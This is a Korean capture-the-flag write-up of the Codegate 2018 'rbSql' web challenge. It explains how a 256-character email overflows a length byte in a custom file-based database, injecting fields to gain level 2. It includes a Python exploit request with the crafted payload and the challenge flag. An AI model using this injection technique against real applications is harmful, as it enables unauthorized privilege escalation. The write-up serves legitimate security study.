# [WEB] Codegate 2018 Quals - rbSql

## Description

Just Source File

## Analysis

이 문제도 소스코드가 주어졌다.

소스코드를 읽어보면 알다시피 파일 형태로 저장되는 Custom Database 문제이다.

구축을 해볼려다가 에러를 못잡아서 구축을 포기하고 그냥 문제를 풀기로 했다.

index.php에서의 역할은 다음과 같다.

*  join : create -> insert
*  login : select
*  me : 로그인 된 계정의 lvl이 2일 경우 Flag get!

이 외의 기능이 없다.

딱봐도 insert로 무언가를 해야 할 것 같은 문제이다.

database를 핸들링 하는 코드에서 취약점이 발생하는 케이스는 insert이다.

```Php
/*
	dbconn.php
*/
define("STR", chr(1), true);
define("ARR", chr(2), true);
define("SCHEMA", "./rbSql/rbSqlSchema", true);

function rbSql($cmd,$table,$query){
	switch($cmd){
	case "create":
		// ...

	case "select":
        // ...

	case "insert":
		$filePath = rbGetPath($table);
		if(!$filePath) return "Error4";
		$result = rbReadFile($filePath);
		if(count($result[2]) != count($query)) return "Error5";
		$result[count($result)] = $query;
		rbWriteFile($filePath,$result);
		break;

	case "delete":
		// ...
	default:
		return "Error1";
		break;
	}
}
function rbPack($data){
	$rawData = "";
	if(is_string($data)){
		$rawData .= STR . chr(strlen($data)) . $data;
	}
	elseif(is_array($data)){
		$rawData .= ARR . chr(count($data));
		for($idx=0;$idx<count($data);$idx++) $rawData .= rbPack($data[$idx]);
	}
	var_dump($rawData);
	return $rawData;
}
function rbWriteFile($filePath,$fileContent){
	$opened = fopen($filePath, "w") or die("Unable to open file!");
	fwrite($opened,rbPack($fileContent));
	fclose($opened);
	clearstatcache();
}
```

rbPack 함수를 보면 재귀형태로 구현되어 있으며 타입이 Array인지 String인지를 파악하여 rawData를 만들어준다.

DB는 아래의 형태로 구성된다.

```
00000000: 0203 010c 6d65 6d62 6572 5f73 6870 696b  ....member_shpik
00000010: 011e 2e2f 7262 5371 6c2f 7262 5371 6c5f  .../rbSql/rbSql_
00000020: 6238 6634 3864 3361 6665 3665 6433 3436  b8f48d3afe6ed346
00000030: 0205 0102 6964 0104 6d61 696c 0102 7077  ....id..mail..pw
00000040: 0102 6970 0103 6c76 6c                   ..ip..lvl
```

String의 경우[\x01 + String Length + String Value]이고 Array의 경우 [\x02 + Array 길이 + 재귀] 형태로 저장되는 것을 알 수 있다.

여기서 취약점이 하나 발생하며, index.php의 join의 check부분을 보자.

```Php
if(($uid) && ($upw) && ($umail)){
      if(strlen($uid) < 3) error("id too short");
      if(strlen($uid) > 16) error("id too long");
      if(!ctype_alnum($uid)) error("id must be alnum!");
      if(strlen($umail) > 256) error("email too long");
      include "dbconn.php";
      $upw = md5($upw);
      $uip = $_SERVER['REMOTE_ADDR'];
      if(rbGetPath("member_".$uid)) error("id already existed");
      $ret = rbSql("create","member_".$uid,["id","mail","pw","ip","lvl"]);
      if(is_string($ret)) error("error");
      $ret = rbSql("insert","member_".$uid,[$uid,$umail,$upw,$uip,"1"]);
      if(is_string($ret)) error("error");
      exit("<script>location.href='./?page=login';</script>");
    }
```

umail의 길이가 256까지 가능한데, chr(256)의 경우 \x00의 값이 나온다.

즉, umail의 길이를 256자로 주면 우리가 원하는 값으로 Insert할 수 있다는 것이다!

## Exploit

### Insert SQL Injection

위에서 설명한 논리적인 오류(Logical Error)로 인해 email의 길이를 0으로 만들어 버릴수가 있다.

database 안에 들어가는 컬럼의 순서는 id umail pw ip lvl 이므로 형태에 맞춰서 생성해주자.

```python
import urllib
import urllib2

url = "http://52.78.188.150/rbsql_4f6b17dc3d565ce63ef3c4ff9eef93ad/?page=join_chk"
data = "uid=shpik16&umail=%01%205d93ceb70e2bf5daa84ec3d0cd2c731a%01%0E183.92.253.166%01%012%0aPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP&upw=s1s1"
req = urllib2.Request(url,data)
res = urllib2.urlopen(req)
print res.read()

'''
FLAG{akaneTsunemoriIsSoCuteDontYouThinkSo?}
'''
```

위 스크립트를 이용해 Join한 후에 me를 들어가면 플래그를 얻을 수 있다.



**FLAG{akaneTsunemoriIsSoCuteDontYouThinkSo?}**

